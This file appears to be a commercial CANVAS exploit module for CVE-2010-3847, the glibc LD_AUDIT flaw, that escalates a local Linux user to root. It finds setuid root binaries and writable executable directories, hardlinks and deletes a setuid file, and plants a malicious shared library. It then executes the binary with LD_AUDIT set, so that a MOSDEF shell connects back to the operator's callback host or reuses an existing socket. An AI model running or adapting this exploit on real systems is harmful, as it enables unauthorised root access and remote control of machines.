#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  CVE_2010_3847.py
## Description:
##            :
## Created_On :  Mon Oct 18 09:00:04 EST 2010
## Created_By :  Ronald Huizer
## Modified_On:  Mon Oct 18 09:00:04 EST 2010
## Modified_By:  Ronald Huizer
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
##
## vim: sw=4 ts=4 expandtab
###############################################################################

import time
import errno
import ctypes
import canvasengine
from shellcode import shellcodeGenerator
#from canvasexploit import canvasexploit
from ExploitTypes.localexploit import LocalExploit
from MOSDEF.makeexe import makelinuxexe

NAME="CVE_2010_3847"
DESCRIPTION="glibc rtld LD_AUDIT handling flaw."
DOCUMENTATION = {}
DOCUMENTATION['CVE Name'] = "CVE-2010-3847"
DOCUMENTATION['CVE Url'] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3847"
DOCUMENTATION['References'] = "http://seclists.org/fulldisclosure/2010/Oct/257"
DOCUMENTATION['VENDOR'] = "Linux"
DOCUMENTATION['Date public'] = "10/18/2010"
DOCUMENTATION['NOTES'] = """See the FD post for a ton of details, try this exploit on 
RedHat and derived distributions. If it fails but you think the target is vulnerable, 
try Tavis' checks by hand as this module may not work against some installations."""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['ARCH'] = [ ['Linux',  'i386'] ]
PROPERTY['SITE'] = "Local"
VERSION = "1.0"

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.fd = -1
        self.suid = ""
        self.suids = {}
        self.wxdir = ""
        self.randdir = ""
        self.version = 0

    def getArgs(self):
        return

    def cleanup(self, node):
        if self.fd != -1:
            self.xclose(node, self.fd)

        # We're not sure where we are at this point, so lets unlink/rmdir
        # everything we used.
        if self.randdir:
            node.shell.unlink(self.randdir + '/0xc0cb10c')
            node.shell.rmdir(self.randdir)
            node.shell.unlink(self.randdir)

    def xclose(self, node, fd):
            ret = node.shell.close(fd)
            while ret == -errno.EINTR:
                ret = node.shell.close(fd)
            return ret

    def neededListenerTypes(self):
        return [canvasengine.UNIVERSAL_MOSDEF]

    def find_setuid_files(self, node):
        S_ISUID = node.shell.libc.getdefine('S_ISUID')
        R_OK = node.shell.libc.getdefine('R_OK')
        suids = [ "/bin/su", "/bin/ping", "/bin/ping6", "/bin/umount",
                  "/bin/mount", "/sbin/unix_chkpwd", "/usr/bin/chfn",
                  "/usr/bin/chsh", "/usr/bin/crontab", "/usr/bin/passwd",
                  "/usr/bin/rcp", "/usr/bin/rlogin", "/usr/bin/sudo",
                  "/usr/sbin/mtr", "/usr/sbin/suexec", "/usr/sbin/seunshare" ]

        # Find all setuid root executables
        for suid in suids:
            (ret, stat) = node.shell.stat(suid)
            if ret < 0 or not stat["st_mode"] & S_ISUID or stat["st_uid"] != 0:
                continue;

            # We want to be able to read the suid.  This flaw is exploitable
            # as well without relying on this, but this needs to be implemented.
            if node.shell.access(suid, R_OK):
                self.suids[stat["st_dev"]] = suid

    def prepare(self, node):
        self.log("Cataloging setuid root files on system.")
        self.find_setuid_files(node)
        if not self.suids:
            self.log("Failed to find any setuid root files.")
            return False

        self.log("Found setuid file(s) on unique devices: " +
                 repr(self.suids.values()))

        self.log("Scanning for writable/executable directory.  Bear with it")
        self.wxdir = self.find_wx_dir(node)
        if not self.wxdir:
            self.log("Failed to find a writeable/executable directory")
            return False

        self.log("Found usable directory %s with suid %s" %
                 (self.wxdir, self.suid))

        # Work from the directory we found from now on.
        if node.shell.chdir(self.wxdir) < 0:
            self.log("Failed to chdir() to %s" % self.wxdir)
            return False

        # XXX: randomize later.
        self.randdir = node.shell.mkdtemp(self.wxdir + "/XXXXXX")
        if not self.randdir:
            self.log("Failed to mkdtemp " + self.wxdir + "/XXXXXX")
            return False

        self.log("Created directory: " + self.randdir)

        # Create a hardlink to the setuid executable we will abuse.
        if node.shell.link(self.suid, self.randdir + "/0xc0cb10c") < 0:
            self.log("Failed to link %s to %s" %
                     (self.suid, self.randdir + "/0xc0cb10c"))
            return False

        # Open the suid by the hardlink we just created.
        O_RDONLY = node.shell.libc.getdefine('O_RDONLY')
        self.fd = node.shell.open(self.randdir + "/0xc0cb10c", O_RDONLY)
        if self.fd < 0:
            self.log("Failed to open " + self.randdir + "/0xc0cb10c for reading")
            return False

        # Get rid of the evidence -- we need to replace the 'blah' directory
        # with a DSO.
        if node.shell.unlink(self.randdir + "/0xc0cb10c") < 0:
            self.log("Failed to unlink " + self.randdir + "/0xc0cb10c")
            self.cleanup(node)
            return False

        if node.shell.rmdir(self.randdir) < 0:
            self.log("Failed to rmdir " + self.randdir)
            self.cleanup(node)
            return False

        return True

    def bugger(self, node):
        # Creates the setup needed to abuse the bug on the remote node.
        if not self.prepare(node):
            return 0

        # Upload the appropriate DSO to exploit the flaw.
        # XXX: For now we only support 32-bit targets in this method, as
        # MOSDEF has no 64-bit support on Linux yet.
        r = node.upload("exploits/CVE_2010_3847/Resources/spawn-MOSDEF-x86-32.so",
                        destfilename = self.randdir)
        if r == 0:
            self.log("Upload of evil DSO failed")
            self.cleanup(node)
            return 0

        # Initialize our evil environment
        environ = [ 'LD_AUDIT=$ORIGIN',
                    "MOSDEF_HOST=%s" % self.callback.ip,
                    "MOSDEF_PORT=%d" % self.callback.port,
                    "MOSDEF_TYPE=%d" % self.engine.getMosdefType(canvasengine.LINUXMOSDEF_INTEL),
                    "MOSDEF_ID=%d" % self.engine.getNewMosdefID(self) ]

        r = node.shell.execve("/proc/self/fd/%d" % self.fd, [], environ, 1)
        self.cleanup(node)
        self.log("Sleeping 5 seconds to wait for connect back")
        time.sleep(5)
        ret = self.ISucceeded()
        return ret

    def bugger2(self, node):
        if not self.prepare(node):
            return 0

        # Upload the appropriate DSO to exploit the flaw.
        # XXX: For now we only support 32-bit targets in this method, as
        # MOSDEF has no 64-bit support on Linux yet.
        try:
            r = node.upload("exploits/CVE_2010_3847/Resources/reuse-MOSDEF-x86-32.so",
                        destfilename = self.randdir)
        except:
            self.log("Upload of evil DSO failed")
            self.cleanup(node)
            return False

        # Initialize MOSDEF-C variables
        vars = {
            'MOSDEFD'   : 'MOSDEFD=%d' % node.shell.fd,
            'SUID'      : '/proc/self/fd/%d' % self.fd
        }
        code = """
        #import "local","execve" as "execve"
        #import "local","sendint" as "sendint"
        #import "local","fork" as "fork"
        #import "local","waitpid" as "waitpid"
        #import "local","getpid" as "getpid"
        #import "local","pipe" as "pipe"
        #import "local","exit" as "exit"
        #import "local","strcpy" as "strcpy"
        #import "local","close" as "close"
        #import "local","read" as "read"
        #import "local","write" as "write"

        #import "string","MOSDEFD" as "MOSDEFD"
        #import "string","SUID" as "SUID"

        void int2str(char *dest, int num)
        {
                int count;
                int tmp;

                count = 0;
                for (tmp = num; tmp != 0; count = count + 1) {
                        tmp = tmp / 10;
                }

                for (dest[count] = 0; count != 0; count = count - 1) {
                        dest[count - 1] = '0' + num % 10;
                        num = num / 10;
                }
        }
 
        int
        main(void)
        {
                char buf[128];
                char *env[6];
                int pipes[2];
                int status;
                int pid;
                int ret;

                ret = pipe(pipes);
                if (ret < 0) {
                        sendint(-1);
                        return 1;
                }

                // Pass the write end of the pipe pair through the
                // environment.
                strcpy(buf, "PIPEFD=");
                int2str(buf + 7, pipes[1]);

                // Prepare the environment strings already.
                env[0] = "LD_AUDIT=$ORIGIN";
                env[1] = MOSDEFD;
                env[2] = buf;
                env[3] = 0;            
            
                pid = fork();
                if (pid < 0) {
                        sendint(-2);
                        return 1;
                }

                if (pid > 0) {
                        close(pipes[1]);

                        // Read a byte from the pipe.  On exploit success we
                        // should read one byte, on failure EOF.
                        ret = read(pipes[0], buf, 1);
                        if (ret != 1) {
                                waitpid(pid, &status, 0);
                                sendint(-3);
                                return 1;
                        }
                        close(pipes[0]);

                        // Check if execve() failed or not.
                        if (buf[0] == '1') {
                                waitpid(pid, &status, 0);
                                sendint(-4);
                                return 1;
                        }

                        // Exploit successful -- we signal it.
                        sendint(0);

                        // And wait for the child to clean up, then exit.
                        waitpid(pid, &status, 0);
                        return 0;
                } else {
                        close(pipes[0]);
                        execve(SUID, 0, env);

                        // If execve fails, we send '1' on the pipe
                        write(pipes[1], "1", 1);
                        exit(1);
                }
        }
        """

        ret = ctypes.c_int(node.shell.runCode(code, vars)).value
        self.cleanup(node)

        if ret == 0:
            self.log("Got root!")
            return True
        else:
            self.log("Error: %s" % { -1 : "pipe() failed", 
                                     -2 : "fork() failed",
                                     -3 : "exploit failed",
                                     -4 : "execve() failed" }[ret])
        return False 

    def test_wx_dirs(self, node, dirs):
        X_OK = node.shell.libc.getdefine('X_OK')
        W_OK = node.shell.libc.getdefine('W_OK')

        for dir in dirs:
            # If this directory is not on the same filesystem as the
            # setuid binary, we cannot use it, as we need to hardlink.
            (ret, stat) = node.shell.stat(dir)
            if ret < 0 or stat["st_dev"] not in self.suids:
                continue

            # If we cannot execute or write to the dir, skip it
            if not node.shell.access(dir, W_OK | X_OK):
                continue

            # XXX: if statvfs() fails we may want to do better.
            try:
                vstat = node.shell.statvfs(dir)
            except:
                continue

            # We don't want NOEXEC directories.
            if vstat["f_flag"] & node.shell.libc.getdefine('ST_NOEXEC'):
                continue

            # Nor do we want NOSUID directories.
            if vstat["f_flag"] & node.shell.libc.getdefine('ST_NOSUID'):
                continue

            # If we're here, the directory is suitable.
            self.suid = self.suids[stat["st_dev"]]
            return dir

        return ""

    def get_home_dir(self, node):
        # Next up is our home directory, assuming we can manage to determine
        # what it is in the first place.
        uid = node.shell.getuid()
        self.log("Trying to determine home directory for uid %d..." % uid)
        # XXX: yes, we do this the ugly way.  Implementing this in MOSDEF-libc
        # means we would have to emulate the glibc NSS layer in order to have
        # NIS and so on.  We might want to avoid this :-)
        pwdent = node.shell.runcommand("/usr/bin/getent passwd %d" % uid)
        pwdent = pwdent.split(':')
        # XXX: sanity check, we want to make sure this is not the shell
        # returning errors that getent was not found.
        if len(pwdent) == 7 and int(pwdent[2]) == uid:
            self.log("Found home directory: %s" % pwdent[-2])
            return pwdent[-2]
        else:
            self.log("Failed to determine home directory")
            return ""

    def __name(self, base, file):
        if base[-1] != '/':
            return base + '/' + file
        else:
            return base + file

    def test_dirs(self, node, root, exclude = [], depth = 2):
        S_IFDIR = node.shell.libc.getdefine('S_IFDIR')
        dirs = [root]

        for i in xrange(0, depth):
            for dir in dirs:
                exclude.append(self.__name(dir, '.'))
                exclude.append(self.__name(dir, '..'))
                dirs = dirs + [ self.__name(dir, d[0]) for d in node.shell.dodir(dir)
                       if self.__name(dir, d[0]) not in exclude and d[1]["st_mode"] & S_IFDIR ]

            exclude = exclude + dirs

        # See if any of these directories works.
        dir = self.test_wx_dirs(node, dirs)
        if dir:
            return dir

        return ""

    def find_wx_dir(self, node):
        # First pass, just have some hardcoded directories we check.
        dirs = [ '/dev/shm', '/var/tmp', '/usr/tmp', '/tmp' ]
        dir = self.test_wx_dirs(node, dirs)

        if dir:
            return dir

        # Now try if we have a home directory, and if so scan from there.
        dir = self.get_home_dir(node)
        if dir:
            self.log("Scanning home directory for wx directories.")
            dir = self.test_dirs(node, dir, dirs, 1)
            if dir:
                return dir

        # We didn't find any suitable directory, so we try a bit harder by
        # scanning from the root downwards a couple of layers.
        dir = self.test_dirs(node, "/", dirs + ["/proc"])
        if dir:
            return dir

        return ""

    def run(self):
        self.setInfo("%s (in progress)" % NAME)
        self.getArgs()

        if self.version == 0:
            self.log("Using new MOSDEF callback")

            if not self.callback:
                self.log('[-] No callback set!')
                return False
        elif self.version == 1:
            self.log("Reusing existing MOSDEF socket")

        for node in self.argsDict["passednodes"]:
            nodename=node.getname()
            caps = node.capabilities

            if "linux" not in caps:
                self.log("Node %s not a Linux node..." % nodename)
                continue
            else:
                if self.version == 0:
                    return self.bugger(node)
                elif self.version == 1:
                    return self.bugger2(node)

        return False

if __name__ == "__main__":
    print "This module is meant to be run only within CANVAS"
